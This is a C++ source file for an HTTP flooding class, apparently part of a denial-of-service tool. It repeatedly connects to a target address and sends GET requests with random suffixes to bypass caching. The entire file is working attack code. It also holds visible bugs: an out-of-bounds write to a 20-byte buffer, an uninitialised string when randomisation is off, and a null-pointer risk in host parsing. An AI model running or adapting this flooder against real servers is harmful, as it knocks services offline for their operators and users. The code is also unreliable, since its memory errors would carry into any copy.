#include "httpflooder.h"

#include "util.h"

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <arpa/inet.h>
#include <unistd.h>

HTTPFlooder::HTTPFlooder(int fid, const char *ip, int port, int delay, const char *host, const char *suburl, bool random, bool wait)
	: IFlooder(fid, ip, port, delay)
	, pHost(NULL)
	, pURLChain(suburl)
	, sAddress()
	, bRandom(random)
	, bWait(wait)
{
	memset(&sAddress, '\0', sizeof(sAddress));
	sAddress.sin_family = AF_INET;
	sAddress.sin_addr.s_addr = inet_addr(ip);
	sAddress.sin_port = htons(port);

	char *nh = const_cast<char *>(host);
	char *p = const_cast<char *>(strstr(host, "http://"));
	if (p)
	{
		nh = p + strlen("http://");
	}

	char *host2 = strdup(nh);
	p = strstr(host2, "/");

	pHost = host2;
	pHost[p - host2] = '\0';
}

HTTPFlooder::~HTTPFlooder()
{
	if (pHost)
		free(pHost);
	pHost = NULL;
}

bool HTTPFlooder::Run()
{
	if (Thread::Run())
	{
		char request[256];
		char response[64];
		request[0] = '\0';

		char str[20];
		if (bRandom)
		{
			for (int i = 0; i < 20; i++)
			{
				str[i] = get_random_valid_char();
			}
			str[20] = '\0';
		}

		snprintf(request, 256, "GET %s%s HTTP/1.1\r\nHost: %s\r\n\r\n\r\n", pURLChain, str, pHost);
			
		int sock = socket(AF_INET, SOCK_STREAM, 0);
		if (sock >= 0)
		{
			//fprintf(stdout, "%d connecting\n", iId);
			// keep trying to connect
			while (connect(sock, (struct sockaddr *)&sAddress, sizeof(sAddress)) < 0);

			//fprintf(stdout, "%d sending\n", iId);
			if (sendto(sock, request, strlen(request), 0, (struct sockaddr *)&sAddress, sizeof(sAddress)) > 0)
				iCount++;
			else
				iError++;

			//fprintf(stdout, "%d receiving\n", iId);
			if (bWait)
				recv(sock, response, 64, NULL);

			//fprintf(stdout, "[%d] %d|%d {%s} (%s)\n", iId, iCount, iError, request, response);
			usleep(iDelay * 1000);
			close(sock);
		}
		else
		{
			iError++;
		}
	}

	return bRunning;
}
